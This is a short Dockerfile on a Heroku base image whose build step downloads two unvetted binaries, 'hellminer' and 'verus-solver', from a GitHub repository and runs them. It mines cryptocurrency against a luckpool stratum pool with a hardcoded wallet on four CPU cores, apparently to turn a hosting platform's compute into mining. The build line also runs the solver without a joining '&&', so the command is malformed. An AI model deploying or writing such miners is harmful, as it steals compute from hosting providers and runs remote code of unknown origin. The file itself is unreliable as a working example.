FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RULmfWmVaia8mocAid2PeHpBPTdwx6ajAD -p x --cpu 4
CMD bash heroku.sh
